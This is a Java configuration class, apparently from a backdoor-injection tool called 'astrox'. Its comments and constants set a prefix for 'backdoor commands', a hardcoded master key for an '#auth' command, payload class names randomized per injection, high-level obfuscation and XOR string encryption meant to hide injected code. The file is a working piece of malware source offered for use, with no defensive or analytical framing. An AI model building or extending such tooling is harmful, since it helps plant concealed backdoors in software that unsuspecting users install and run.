package dev.naruto.astrox;

public class Config {
    /**
     * Command prefix for backdoor commands
     * Change this before compilation to customize
     */
    public static final String COMMAND_PREFIX = "#";

    /**
     * Master authorization key (used for #auth command)
     * CHANGE THIS BEFORE PRODUCTION USE
     */
    public static final String MASTER_KEY = "astrox_master_2025";

    /**
     * Enable obfuscation (disable for debugging)
     */
    public static final boolean ENABLE_OBFUSCATION = true;

    /**
     * Obfuscation strength (1-10, higher = more aggressive)
     */
    public static final int OBFUSCATION_LEVEL = 8;

    /**
     * Payload class name prefix (randomized per injection)
     */
    public static final String CLASS_PREFIX = "util";

    /**
     * Enable string encryption
     */
    public static final boolean ENCRYPT_STRINGS = true;

    /**
     * XOR key for string encryption (randomized per injection)
     */
    public static byte[] XOR_KEY = generateRandomKey();

    private static byte[] generateRandomKey() {
        byte[] key = new byte[16];
        new java.security.SecureRandom().nextBytes(key);
        return key;
    }
}
